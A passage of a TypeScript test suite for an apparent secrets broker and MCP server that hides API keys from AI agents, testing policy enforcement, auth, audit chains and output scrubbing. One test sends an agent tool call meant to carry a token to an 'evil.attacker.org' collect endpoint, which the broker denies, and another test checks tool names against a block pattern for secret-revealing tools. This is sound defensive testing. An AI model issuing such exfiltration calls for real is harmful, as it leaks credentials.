      const scrubPayload = JSON.parse(String((streamRes.result as any).content[0].text));
      assert.equal(scrubPayload.scrubbedText, 'Leaked [REDACTED:pw1://openai/prod_key] in trace');
    } finally {
      mcp.close();
      vault.close();
    }
  });
});

describe('Empirical 8-Scenario Red-vs-Blue Benchmark Assertions', () => {
  test('18. Password One achieves 100% defense across S1-S7, 0 context leaks, and 100% authorized S8 success', async () => {
    const report = await runRedBlueBenchmark({ microIterations: 50 });

    assert.equal(report.scenarios.length, 8);
    assert.equal(report.scorecards.raw_env_agent.attacksDefended, 0);
    assert.equal(report.scorecards.naive_placeholder_broker.attacksDefended, 1); // Only S1 defended!
    assert.equal(report.scorecards.password_one.attacksDefended, 7);
    assert.equal(report.scorecards.password_one.attackDefenseRatePct, 100);
    assert.equal(report.scorecards.password_one.secretsLeakedCount, 0);
    assert.equal(report.scorecards.password_one.llmContextSecretExposures, 0);
    assert.equal(report.scorecards.password_one.authorizedWorkflowSuccessRatePct, 100);
    assert.equal(report.auditChainIntegrity.valid, true);
  });

  test('19. HTTPS-only default policy rejects plain HTTP requests even to an allowlisted hostname', async () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'https-only-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'prod/https_strict',
      value: 'sk_' + 'live_HttpsOnlySecretKey999',
      policy: { allowedHosts: ['api.stripe.com'], allowedTools: ['http'] }, // allowHttp defaults to false
    });
    const broker = new PasswordOneBroker(vault);
    try {
      await assert.rejects(
        broker.executeHttp({
          url: 'http://api.stripe.com/v1/customers',
          auth: { type: 'bearer', secret: 'pw1://prod/https_strict' },
        }),
        PolicyViolationError
      );
    } finally {
      vault.close();
    }
  });

  test('20. Subprocess allowEnvInjection=false permits CLI arg placeholders while blocking secretEnv injection', async () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'arg-only-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'cli/arg_only',
      value: 'arg_secret_8877665544',
      policy: {
        allowedTools: ['exec'],
        allowedCommands: ['node'],
        allowEnvInjection: false,
      },
    });
    const broker = new PasswordOneBroker(vault);
    try {
      await assert.rejects(
        broker.executeCommand({
          command: process.execPath,
          args: ['-v'],
          secretEnv: { MY_ENV: 'pw1://cli/arg_only' },
        }),
        PolicyViolationError
      );

      const okRes = await broker.executeCommand({
        command: process.execPath,
        args: ['-e', 'process.stdout.write("arg_len=" + process.argv[1].length)', '{{pw1://cli/arg_only}}'],
      });
      assert.equal(okRes.exitCode, 0);
      assert.equal(okRes.stdout, 'arg_len=21');
    } finally {
      vault.close();
    }
  });

  test('21. Audit chain detects row deletion (sequence & prev_hash link break)', () => {
    const dir = mkdtempSync(join(tmpdir(), 'pw1-audit-gap-'));
    const dbPath = join(dir, 'gap.sqlite');
    try {
      const vault = new PasswordOneVault({ dbPath, masterKey: 'audit-gap-key-2026', scryptN: 1024 });
      vault.appendAudit({ action: 'E1', decision: 'ALLOW', reason: 'First' });
      vault.appendAudit({ action: 'E2', decision: 'ALLOW', reason: 'Second' });
      vault.appendAudit({ action: 'E3', decision: 'ALLOW', reason: 'Third' });
      assert.equal(vault.verifyAuditChain().valid, true);

      const raw = new DatabaseSync(dbPath);
      raw.prepare('DELETE FROM audit_logs WHERE seq = 2').run();
      raw.close();

      const verify = vault.verifyAuditChain();
      assert.equal(verify.valid, false);
      assert.equal(verify.brokenAtSeq, 3);
      vault.close();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('22. MCP pw1_http_request SSRF denial and pw1_audit_verify work end-to-end', async () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'mcp-ssrf-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'gh/token',
      value: 'ghp_McpSsrfProtectedToken1122334455',
      policy: { allowedHosts: ['api.github.com'], allowedTools: ['http'] },
    });
    const broker = new PasswordOneBroker(vault);
    const dispatcher = new PasswordOneMcpDispatcher(vault, broker);
    try {
      const denyRes = await dispatcher.handleMessage({
        jsonrpc: '2.0',
        id: 10,
        method: 'tools/call',
        params: {
          name: 'pw1_http_request',
          arguments: {
            url: 'https://evil.attacker.org/collect',
            auth: { type: 'bearer', secret: 'pw1://gh/token' },
          },
        },
      });
      assert.equal((denyRes?.result as any).isError, true);

      const auditRes = await dispatcher.handleMessage({
        jsonrpc: '2.0',
        id: 11,
        method: 'tools/call',
        params: {
          name: 'pw1_audit_verify',
          arguments: { limit: 5 },
        },
      });
      const auditData = JSON.parse(String((auditRes?.result as any).content[0].text));
      assert.equal(auditData.verification.valid, true);
      assert.equal(auditData.entries[0].action, 'HTTP_DENY');
    } finally {
      vault.close();
    }
  });
});

describe('Bearer Authentication, Fail-Closed Binding & Streamable HTTP /mcp', () => {
  test('23. Non-loopback host fails closed when authToken is missing/short or masterKey is missing/default', async () => {
    assert.equal(isLoopbackHost('127.0.0.1'), true);
    assert.equal(isLoopbackHost('::1'), true);
    assert.equal(isLoopbackHost('localhost'), true);
    assert.equal(isLoopbackHost('LOCALHOST'), true);
    assert.equal(isLoopbackHost('100.108.223.41'), false);
    assert.equal(isLoopbackHost('0.0.0.0'), false);
    assert.equal(isLoopbackHost('::'), false);
    assert.equal(isLoopbackHost('127.0.0.2'), false);

    const prevToken = process.env.PW1_AUTH_TOKEN;
    const prevMaster = process.env.PW1_MASTER_KEY;
    try {
      delete process.env.PW1_AUTH_TOKEN;
      delete process.env.PW1_MASTER_KEY;

      // 1. Non-loopback host without authToken
      await assert.rejects(
        startPasswordOneServer({
          port: 0,
          host: '100.108.223.41',
          dataPath: ':memory:',
          masterKey: 'strong-explicit-prod-master-key-2026',
          scryptN: 1024,
        }),
        PasswordOneError
      );

      // 2. Non-loopback host with authToken shorter than 16 chars
      await assert.rejects(
        startPasswordOneServer({
          port: 0,
          host: '100.108.223.41',
          dataPath: ':memory:',
          masterKey: 'strong-explicit-prod-master-key-2026',
          authToken: 'short-15-chars!',
          scryptN: 1024,
        }),
        PasswordOneError
      );

      // 3. Wildcard bind 0.0.0.0 without authToken
      await assert.rejects(
        startPasswordOneServer({
          port: 0,
          host: '0.0.0.0',
          dataPath: ':memory:',
          masterKey: 'strong-explicit-prod-master-key-2026',
          scryptN: 1024,
        }),
        PasswordOneError
      );

      // 4. Non-loopback host with valid authToken but missing masterKey (env unset)
      await assert.rejects(
        startPasswordOneServer({
          port: 0,
          host: '100.108.223.41',
          dataPath: ':memory:',
          authToken: 'valid-bearer-token-at-least-16-chars',
          scryptN: 1024,
        }),
        PasswordOneError
      );

      // 5. Non-loopback host with empty PW1_MASTER_KEY env var
      process.env.PW1_MASTER_KEY = '   ';
      await assert.rejects(
        startPasswordOneServer({
          port: 0,
          host: '100.108.223.41',
          dataPath: ':memory:',
          authToken: 'valid-bearer-token-at-least-16-chars',
          scryptN: 1024,
        }),
        PasswordOneError
      );

      // 6. Non-loopback host with PW1_MASTER_KEY equal to hardcoded dev default
      process.env.PW1_MASTER_KEY = DEFAULT_DEV_MASTER_KEY;
      await assert.rejects(
        startPasswordOneServer({
          port: 0,
          host: '100.108.223.41',
          dataPath: ':memory:',
          authToken: 'valid-bearer-token-at-least-16-chars',
          scryptN: 1024,
        }),
        PasswordOneError
      );

      // 7. Non-loopback host with options.masterKey equal to hardcoded dev default
      delete process.env.PW1_MASTER_KEY;
      await assert.rejects(
        startPasswordOneServer({
          port: 0,
          host: '100.108.223.41',
          dataPath: ':memory:',
          masterKey: DEFAULT_DEV_MASTER_KEY,
          authToken: 'valid-bearer-token-at-least-16-chars',
          scryptN: 1024,
        }),
        PasswordOneError
      );
    } finally {
      if (prevToken === undefined) delete process.env.PW1_AUTH_TOKEN;
      else process.env.PW1_AUTH_TOKEN = prevToken;
      if (prevMaster === undefined) delete process.env.PW1_MASTER_KEY;
      else process.env.PW1_MASTER_KEY = prevMaster;
    }
  });

  test('24. Bearer auth minimizes unauthenticated /health and guards /v1/* and /mcp with 401', async () => {
    const token = 'pw1-bearer-auth-token-test-2026-secure';
    const prevToken = process.env.PW1_AUTH_TOKEN;
    process.env.PW1_AUTH_TOKEN = `  ${token}  `;

    const srv = await startPasswordOneServer({
      port: 0,
      host: '127.0.0.1',
      dataPath: ':memory:',
      masterKey: 'auth-test-master-key-2026',
      scryptN: 1024,
    });

    try {
      assert.equal(srv.authEnabled, true);

      // Unauthenticated GET /health returns minimal payload only
      const healthAnon = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'GET',
        path: '/health',
      });
      assert.equal(healthAnon.status, 200);
      assert.deepEqual(healthAnon.json, {
        ok: true,
        service: 'password-one',
        version: SERVICE_VERSION,
      });
      assert.equal('secretsCount' in healthAnon.json, false);
      assert.equal('auditHeadHash' in healthAnon.json, false);
      assert.equal('activeGrantsCount' in healthAnon.json, false);

      // Wrong token on GET /health also returns minimal payload only
      const healthWrong = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'GET',
        path: '/health',
        headers: { Authorization: 'Bearer wrong-token-value' },
      });
      assert.equal(healthWrong.status, 200);
      assert.deepEqual(healthWrong.json, {
        ok: true,
        service: 'password-one',
        version: SERVICE_VERSION,
      });

      // Valid Bearer token on GET /health returns full runtime status
      const healthAuthed = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'GET',
        path: '/health',
        headers: { Authorization: `Bearer ${token}` },
      });
      assert.equal(healthAuthed.status, 200);
      assert.equal(healthAuthed.json.ok, true);
      assert.equal(healthAuthed.json.service, 'password-one');
      assert.equal(healthAuthed.json.version, SERVICE_VERSION);
      assert.equal(healthAuthed.json.secretsCount, 0);
      assert.equal(healthAuthed.json.activeGrantsCount, 0);
      assert.equal(healthAuthed.json.auditChainValid, true);
      assert.equal(typeof healthAuthed.json.auditHeadHash, 'string');
      assert.equal(typeof healthAuthed.json.uptimeMs, 'number');

      const expectedUnauthorized = {
        ok: false,
        error: {
          code: 'UNAUTHORIZED',
          message: 'Valid Bearer token required',
        },
      };

      // Missing / wrong / non-Bearer tokens rejected with 401 on /v1/secrets and /mcp
      const sameLengthWrong = 'x'.repeat(token.length);
      for (const reqSpec of [
        { method: 'GET', path: '/v1/secrets', headers: undefined },
        { method: 'GET', path: '/v1/secrets', headers: { Authorization: 'Bearer short-wrong' } },
        { method: 'GET', path: '/v1/secrets', headers: { Authorization: `Bearer ${sameLengthWrong}` } },
        { method: 'GET', path: '/v1/secrets', headers: { Authorization: `Basic ${token}` } },
        {
          method: 'POST',
          path: '/mcp',
          headers: undefined,
          body: { jsonrpc: '2.0', id: 1, method: 'tools/list' },
        },
        {
          method: 'POST',
          path: '/mcp',
          headers: { Authorization: `Bearer ${sameLengthWrong}` },
          body: { jsonrpc: '2.0', id: 1, method: 'tools/list' },
        },
        { method: 'GET', path: '/mcp', headers: undefined },
        { method: 'DELETE', path: '/mcp', headers: undefined },
      ]) {
        const res = await httpRawRequest({
          baseUrl: srv.baseUrl,
          method: reqSpec.method,
          path: reqSpec.path,
          headers: reqSpec.headers,
          body: reqSpec.body,
        });
        assert.equal(res.status, 401, `Expected 401 for ${reqSpec.method} ${reqSpec.path}`);
        assert.deepEqual(res.json, expectedUnauthorized);
      }

      // Valid Bearer token accesses /v1/secrets normally
      const secretsOk = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'GET',
        path: '/v1/secrets',
        headers: { Authorization: `Bearer ${token}` },
      });
      assert.equal(secretsOk.status, 200);
      assert.equal(secretsOk.json.ok, true);
      assert.deepEqual(secretsOk.json.secrets, []);
    } finally {
      await srv.close();
      if (prevToken === undefined) delete process.env.PW1_AUTH_TOKEN;
      else process.env.PW1_AUTH_TOKEN = prevToken;
    }
  });

  test('25. Streamable HTTP /mcp supports initialize, notifications/initialized (202), tools/list, tools/call, batches, GET 405, DELETE 200', async () => {
    const token = 'pw1-streamable-mcp-auth-token-2026-xyz';
    const fakeSecret = 'sk_' + 'live_StreamableMcpSecret889900';

    const srv = await startPasswordOneServer({
      port: 0,
      host: '127.0.0.1',
      dataPath: ':memory:',
      masterKey: 'streamable-mcp-master-key-2026',
      authToken: token,
      scryptN: 1024,
    });

    try {
      srv.vault.upsertSecret({
        alias: 'stripe/mcp_http_key',
        value: fakeSecret,
        description: 'Streamable MCP test secret',
        policy: { allowedHosts: ['api.stripe.com'], allowedTools: ['http'] },
      });

      const authHeaders = {
        Authorization: `Bearer ${token}`,
        Accept: 'application/json, text/event-stream',
      };

      // 1. initialize -> 200 OK + Mcp-Session-Id header
      const initRes = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/mcp',
        headers: authHeaders,
        body: {
          jsonrpc: '2.0',
          id: 1,
          method: 'initialize',
          params: {
            protocolVersion: '2025-03-26',
            capabilities: {},
            clientInfo: { name: 'test-streamable-client', version: '1.0.0' },
          },
        },
      });
      assert.equal(initRes.status, 200);
      assert.equal(initRes.headers['content-type'], 'application/json; charset=utf-8');
      const sessionId = initRes.headers['mcp-session-id'];
      assert.equal(typeof sessionId, 'string');
      assert.equal((sessionId as string).length >= 16, true);
      assert.equal(initRes.json.jsonrpc, '2.0');
      assert.equal(initRes.json.id, 1);
      assert.equal(initRes.json.result.protocolVersion, '2025-03-26');
      assert.equal(initRes.json.result.serverInfo.name, '@opc/password-one');
      assert.equal(initRes.json.result.serverInfo.version, SERVICE_VERSION);

      const sessionHeaders = {
        ...authHeaders,
        'Mcp-Session-Id': sessionId as string,
      };

      // 2. notifications/initialized (no id) -> 202 Accepted
      const notifyRes = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/mcp',
        headers: sessionHeaders,
        body: {
          jsonrpc: '2.0',
          method: 'notifications/initialized',
        },
      });
      assert.equal(notifyRes.status, 202);
      assert.equal(notifyRes.text, '');

      // 3. tools/list -> exact 5 safe tools, zero plaintext-read tools
      const listRes = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/mcp',
        headers: sessionHeaders,
        body: {
          jsonrpc: '2.0',
          id: 2,
          method: 'tools/list',
        },
      });
      assert.equal(listRes.status, 200);
      assert.equal(listRes.headers['content-type'], 'application/json; charset=utf-8');
      const toolNames = (listRes.json.result.tools as { name: string }[]).map((t) => t.name);
      assert.deepEqual(toolNames, [
        'pw1_list_handles',
        'pw1_http_request',
        'pw1_exec_command',
        'pw1_scrub_output',
        'pw1_audit_verify',
      ]);
      for (const name of toolNames) {
        assert.doesNotMatch(name, /get_secret|read_secret|plaintext|decrypt|reveal/i);
      }

      // 4. tools/call pw1_list_handles -> lists opaque handle, never plaintext
      const handlesRes = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/mcp',
        headers: sessionHeaders,
        body: {
          jsonrpc: '2.0',
          id: 3,
          method: 'tools/call',
          params: { name: 'pw1_list_handles', arguments: {} },
        },
      });
      assert.equal(handlesRes.status, 200);
      const handlesText = String(handlesRes.json.result.content[0].text);
      assert.equal(handlesText.includes('pw1://stripe/mcp_http_key'), true);
      assert.equal(handlesText.includes(fakeSecret), false);

      // 5. tools/call pw1_scrub_output -> scrubs raw and Base64 secret encodings
      const b64Secret = Buffer.from(fakeSecret, 'utf8').toString('base64');
      const scrubRes = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/mcp',
        headers: sessionHeaders,
        body: {
          jsonrpc: '2.0',
          id: 4,
          method: 'tools/call',
          params: {
            name: 'pw1_scrub_output',
            arguments: { text: `Leaked raw=${fakeSecret} b64=${b64Secret}` },
          },
        },
      });
      assert.equal(scrubRes.status, 200);
      const scrubPayload = JSON.parse(String(scrubRes.json.result.content[0].text));
      assert.equal(scrubPayload.redactionsCount >= 2, true);
      assert.deepEqual(scrubPayload.redactedAliases, ['stripe/mcp_http_key']);
      assert.equal(scrubPayload.scrubbedText.includes(fakeSecret), false);
      assert.equal(scrubPayload.scrubbedText.includes(b64Secret), false);
      assert.equal(
        scrubPayload.scrubbedText,
        'Leaked raw=[REDACTED:pw1://stripe/mcp_http_key] b64=[REDACTED:pw1://stripe/mcp_http_key]'
      );

      // 6. JSON-RPC batch (mixed notification + request -> 200 array; notifications-only -> 202; empty -> 400; malformed -> 400)
      const batchMixed = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/mcp',
        headers: sessionHeaders,
        body: [
          { jsonrpc: '2.0', method: 'notifications/initialized' },
          { jsonrpc: '2.0', id: 5, method: 'ping' },
        ],
      });
      assert.equal(batchMixed.status, 200);
      assert.equal(Array.isArray(batchMixed.json), true);
      assert.equal(batchMixed.json.length, 1);
      assert.equal(batchMixed.json[0].id, 5);
      assert.deepEqual(batchMixed.json[0].result, {});

      const batchNotifyOnly = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/mcp',
        headers: sessionHeaders,
        body: [{ jsonrpc: '2.0', method: 'notifications/initialized' }],
      });
      assert.equal(batchNotifyOnly.status, 202);
      assert.equal(batchNotifyOnly.text, '');

      const batchEmpty = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/mcp',
        headers: sessionHeaders,
        body: [],
      });
      assert.equal(batchEmpty.status, 400);
      assert.equal(batchEmpty.json.error.code, -32600);

      const badJson = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/mcp',
        headers: sessionHeaders,
        rawBody: '{not valid json',
      });
      assert.equal(badJson.status, 400);
      assert.equal(badJson.json.error.code, -32700);

      // 7. GET /mcp -> 405 Method Not Allowed with Allow: POST, DELETE
      const getMcp = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'GET',
        path: '/mcp',
        headers: sessionHeaders,
      });
      assert.equal(getMcp.status, 405);
      assert.equal(getMcp.headers['allow'], 'POST, DELETE');

      // 8. DELETE /mcp -> 200 OK { ok: true }
      const delMcp = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'DELETE',
        path: '/mcp',
        headers: sessionHeaders,
      });
      assert.equal(delMcp.status, 200);
      assert.deepEqual(delMcp.json, { ok: true });
    } finally {
      await srv.close();
    }
  });

  test('26. CLI serve supports env configuration and never logs PW1_MASTER_KEY or PW1_AUTH_TOKEN', async () => {
    const cliMasterKey = 'cli-sentinel-master-key-do-not-log-9988';
    const cliAuthToken = 'cli-sentinel-bearer-token-do-not-log-7766';

    const child = spawn(process.execPath, ['src/cli.ts', 'serve'], {
      cwd: process.cwd(),
      env: {
        ...process.env,
        HOST: '127.0.0.1',
        PORT: '0',
        DATA_PATH: ':memory:',
        PW1_MASTER_KEY: cliMasterKey,
        PW1_AUTH_TOKEN: cliAuthToken,
      },
      stdio: ['ignore', 'pipe', 'pipe'],
    });

    let stdoutBuf = '';
    let stderrBuf = '';
    let childExited = false;
    const childExitPromise = new Promise<number | null>((resolve) => {
      child.once('exit', (code: number | null) => {
        childExited = true;
        resolve(code);
      });
    });

    try {
      const listeningUrl = await new Promise<string>((resolve, reject) => {
        const timeout = setTimeout(() => {
          reject(new Error(`CLI serve timed out. stdout=${stdoutBuf} stderr=${stderrBuf}`));
        }, 5000);

        child.stdout?.on('data', (chunk: Buffer) => {
          stdoutBuf += chunk.toString('utf8');
          const match = /Listening on (http:\/\/127\.0\.0\.1:\d+)/.exec(stdoutBuf);
          if (match) {
            clearTimeout(timeout);
            resolve(match[1]);
          }
        });
        child.stderr?.on('data', (chunk: Buffer) => {
          stderrBuf += chunk.toString('utf8');
        });
        void childExitPromise.then((code) => {
          clearTimeout(timeout);
          reject(new Error(`CLI exited early with code ${String(code)}: ${stderrBuf}`));
        });
      });

      assert.equal(stdoutBuf.includes(cliMasterKey), false);
      assert.equal(stdoutBuf.includes(cliAuthToken), false);
      assert.equal(stderrBuf.includes(cliMasterKey), false);
      assert.equal(stderrBuf.includes(cliAuthToken), false);

      const unauthSecrets = await httpRawRequest({
        baseUrl: listeningUrl,
        method: 'GET',
        path: '/v1/secrets',
      });
      assert.equal(unauthSecrets.status, 401);

      const authedSecrets = await httpRawRequest({
        baseUrl: listeningUrl,
        method: 'GET',
        path: '/v1/secrets',
        headers: { Authorization: `Bearer ${cliAuthToken}` },
      });
      assert.equal(authedSecrets.status, 200);
      assert.equal(authedSecrets.json.ok, true);
    } finally {
      if (!childExited) {
        child.kill('SIGTERM');
      }
      await childExitPromise;
    }

    // Fail-closed CLI check on non-loopback without PW1_AUTH_TOKEN
    const failChild = spawn(process.execPath, ['src/cli.ts', 'serve'], {
      cwd: process.cwd(),
      env: {
        ...process.env,
        HOST: '100.108.223.41',
        PORT: '0',
        DATA_PATH: ':memory:',
        PW1_MASTER_KEY: cliMasterKey,
        PW1_AUTH_TOKEN: '',
      },
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    let failOut = '';
    let failErr = '';
    failChild.stdout?.on('data', (c: Buffer) => {
      failOut += c.toString('utf8');
    });
    failChild.stderr?.on('data', (c: Buffer) => {
      failErr += c.toString('utf8');
    });
    const failCode = await new Promise<number | null>((resolve) => {
      failChild.once('exit', (code: number | null) => resolve(code));
    });
    assert.notEqual(failCode, 0);
    assert.match(failErr, /Refusing to bind non-loopback host/);
    assert.equal(failOut.includes(cliMasterKey), false);
    assert.equal(failErr.includes(cliMasterKey), false);
  });
});

describe('Scrubber Pass B Compact JSON Integrity, Dual-Token Isolation, MCP Annotations & Remote CLI', () => {
  test('27. Scrubber Pass B redacts upper/lower %xx secrets in compact JSON, URLs & headers without corrupting unrelated %22/%5C', () => {
    const scrubber = new OutputScrubber();
    const secret = 'sk_' + 'live_CompactJson/Alpha+99=';
    const delimSecret = 'pw1_delim_"quote"\\slash_77';
    const active = [
      { alias: 'stripe/compact', value: secret },
      { alias: 'misc/delim', value: delimSecret },
    ];

    const upperFull = secret
      .replace(/_/g, '%5F')
      .replace(/\//g, '%2F')
      .replace(/\+/g, '%2B')
      .replace(/=/g, '%3D');
    const lowerFull = upperFull.toLowerCase().replace('compactjson', 'CompactJson').replace('alpha', 'Alpha');
    const upperUnderscoreOnly = secret.replace(/_/g, '%5F');
    const lowerUnderscoreOnly = secret.replace(/_/g, '%5f');

    // Compact JSON (zero spaces) combining upper/lower %xx secrets with unrelated %22 and %5C in OTHER fields and SAME field
    const compactPayload = JSON.stringify({
      leakedUpper: upperFull,
      leakedLower: lowerFull,
      leakedPartialUpper: upperUnderscoreOnly,
      leakedPartialLower: lowerUnderscoreOnly,
      unrelatedQuotes: 'keep%22quoted%5Cpath%5cintact',
      unrelatedJsonChars: '%7B%22k%22%3A%22v%22%7D',
      sameFieldMixed: `https://api.example.com/cb?token=${lowerFull}&note=hello%22world%5Cend`,
    });
    assert.equal(compactPayload.includes(' '), false);

    const res = scrubber.scrub(compactPayload, active);
    assert.equal(res.redactionsCount >= 5, true);
    assert.deepEqual(res.redactedAliases, ['stripe/compact']);
    for (const leaked of [secret, upperFull, lowerFull, upperUnderscoreOnly, lowerUnderscoreOnly]) {
      assert.equal(res.scrubbedText.includes(leaked), false, `Secret variant leaked: ${leaked}`);
    }

    // Compact JSON MUST still parse cleanly and keep unrelated %22/%5C fields intact
    const parsed = JSON.parse(res.scrubbedText) as Record<string, string>;
    assert.equal(parsed.leakedUpper, '[REDACTED:pw1://stripe/compact]');
    assert.equal(parsed.leakedLower, '[REDACTED:pw1://stripe/compact]');
    assert.equal(parsed.leakedPartialUpper, '[REDACTED:pw1://stripe/compact]');
    assert.equal(parsed.leakedPartialLower, '[REDACTED:pw1://stripe/compact]');
    assert.equal(parsed.unrelatedQuotes, 'keep%22quoted%5Cpath%5cintact');
    assert.equal(parsed.unrelatedJsonChars, '%7B%22k%22%3A%22v%22%7D');
    assert.equal(
      parsed.sameFieldMixed,
      'https://api.example.com/cb?token=[REDACTED:pw1://stripe/compact]&note=hello%22world%5Cend'
    );

    // URL query strings & HTTP headers with upper/lower %xx are still caught cleanly
    const headerRes = scrubber.scrubHeaders(
      {
        'X-Debug-Url': `https://api.example.com/v1?a=1%222&k=${upperFull}&b=3%5C4`,
        'X-Debug-Header': `Bearer ${lowerUnderscoreOnly}; extra=foo%22bar`,
      },
      active
    );
    assert.equal(headerRes.redactionsCount, 2);
    assert.equal(
      headerRes.headers['X-Debug-Url'],
      'https://api.example.com/v1?a=1%222&k=[REDACTED:pw1://stripe/compact]&b=3%5C4'
    );
    assert.equal(
      headerRes.headers['X-Debug-Header'],
      'Bearer [REDACTED:pw1://stripe/compact]; extra=foo%22bar'
    );

    // Idempotence check
    const second = scrubber.scrub(res.scrubbedText, active);
    assert.equal(second.redactionsCount, 0);
    assert.equal(second.scrubbedText, res.scrubbedText);
  });

  test('28. Dual-token startup fails closed on identical tokens and weak non-loopback brokerToken', async () => {
    const prevAuth = process.env.PW1_AUTH_TOKEN;
    const prevBroker = process.env.PW1_BROKER_TOKEN;
    const prevMaster = process.env.PW1_MASTER_KEY;
    try {
      delete process.env.PW1_AUTH_TOKEN;
      delete process.env.PW1_BROKER_TOKEN;
      delete process.env.PW1_MASTER_KEY;

      // 1. Identical authToken and brokerToken rejected
      await assert.rejects(
        startPasswordOneServer({
          port: 0,
          host: '127.0.0.1',
          dataPath: ':memory:',
          masterKey: 'dual-fail-closed-master-key-2026',
          authToken: 'same-token-value-123456',
          brokerToken: 'same-token-value-123456',
          scryptN: 1024,
        }),
        (err: unknown) => err instanceof PasswordOneError && err.code === 'INVALID_INPUT' && err.statusCode === 400
      );

      // 2. Tokens differing only by leading/trailing whitespace rejected
      await assert.rejects(
        startPasswordOneServer({
          port: 0,
          host: '127.0.0.1',
          dataPath: ':memory:',
          masterKey: 'dual-fail-closed-master-key-2026',
          authToken: '  whitespace-only-diff-token-99  ',
          brokerToken: 'whitespace-only-diff-token-99',
          scryptN: 1024,
        }),
        (err: unknown) => err instanceof PasswordOneError && err.code === 'INVALID_INPUT' && err.statusCode === 400
      );

      // 3. Non-loopback host with weak brokerToken (< 16 chars) rejected even with strong authToken & masterKey
      await assert.rejects(
        startPasswordOneServer({
          port: 0,
          host: '100.108.223.41',
          dataPath: ':memory:',
          masterKey: 'strong-explicit-prod-master-key-2026',
          authToken: 'strong-admin-token-at-least-16-chars',
          brokerToken: 'weak-15-chars!!',
          scryptN: 1024,
        }),
        (err: unknown) => err instanceof PasswordOneError && err.code === 'INVALID_INPUT' && err.statusCode === 400
      );

      // 4. Non-loopback host with only brokerToken (no authToken) rejected
      await assert.rejects(
        startPasswordOneServer({
          port: 0,
          host: '100.108.223.41',
          dataPath: ':memory:',
          masterKey: 'strong-explicit-prod-master-key-2026',
          brokerToken: 'strong-broker-token-at-least-16-chars',
          scryptN: 1024,
        }),
        (err: unknown) => err instanceof PasswordOneError && err.code === 'INVALID_INPUT' && err.statusCode === 400
      );
    } finally {
      if (prevAuth === undefined) delete process.env.PW1_AUTH_TOKEN;
      else process.env.PW1_AUTH_TOKEN = prevAuth;
      if (prevBroker === undefined) delete process.env.PW1_BROKER_TOKEN;
      else process.env.PW1_BROKER_TOKEN = prevBroker;
      if (prevMaster === undefined) delete process.env.PW1_MASTER_KEY;
      else process.env.PW1_MASTER_KEY = prevMaster;
    }
  });

  test('29. Dual-token Admin vs Broker isolation enforces 403 FORBIDDEN on admin routes, allows broker routes & handles broker-only loopback', async () => {
    const adminToken = 'pw1-admin-token-super-secret-2026-aaa';
    const brokerToken = 'pw1-broker-token-agent-scoped-2026-bbb';
    const secretVal = 'sk_' + 'live_DualTokenRoleSecret9988';

    const upstream = createServer((req: IncomingMessage, res: ServerResponse) => {
      const auth = String(req.headers['authorization'] ?? '');
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ authorized: auth === `Bearer ${secretVal}`, echo: auth }));
    });
    await new Promise<void>((r) => upstream.listen(0, '127.0.0.1', r));
    const upPort = (upstream.address() as AddressInfo).port;

    const srv = await startPasswordOneServer({
      port: 0,
      host: '127.0.0.1',
      dataPath: ':memory:',
      masterKey: 'dual-token-test-master-key-2026',
      authToken: adminToken,
      brokerToken,
      scryptN: 1024,
      brokerOptions: {
        resolveOverrides: {
          'api.dual.internal': { address: '127.0.0.1', port: upPort },
        },
      },
    });

    try {
      assert.equal(srv.authEnabled, true);
      assert.equal(srv.brokerAuthEnabled, true);

      const adminHeaders = { Authorization: `Bearer ${adminToken}` };
      const brokerHeaders = { Authorization: `Bearer ${brokerToken}` };
      const expectedForbidden = {
        ok: false,
        error: {
          code: 'FORBIDDEN',
          message: 'Admin token required for this endpoint',
        },
      };

      // Unauthenticated GET /health -> minimal; GET /v1/handles -> 401
      const healthAnon = await httpRawRequest({ baseUrl: srv.baseUrl, method: 'GET', path: '/health' });
      assert.equal(healthAnon.status, 200);
      assert.deepEqual(healthAnon.json, { ok: true, service: 'password-one', version: SERVICE_VERSION });

      const handlesAnon = await httpRawRequest({ baseUrl: srv.baseUrl, method: 'GET', path: '/v1/handles' });
      assert.equal(handlesAnon.status, 401);

      // Admin sets up secret & grant
      const createRes = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/secrets',
        headers: adminHeaders,
        body: {
          alias: 'stripe/dual_key',
          value: secretVal,
          description: 'Dual token E2E secret',
          policy: {
            allowedHosts: ['api.dual.internal'],
            allowedTools: ['http', 'exec'],
            allowedCommands: ['node'],
            allowHttp: true,
            allowEnvInjection: true,
            requireGrant: true,
          },
        },
      });
      assert.equal(createRes.status, 201);

      const grantRes = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/grants',
        headers: adminHeaders,
        body: {
          alias: 'stripe/dual_key',
          agentId: 'broker-agent',
          maxUses: 5,
          ttlSeconds: 120,
        },
      });
      assert.equal(grantRes.status, 201);
      const grantId = String(grantRes.json.grant.grantId);

      // Broker token gets 403 FORBIDDEN on all 4 Admin-only endpoints
      const brokerCreate = await httpRawRequest({
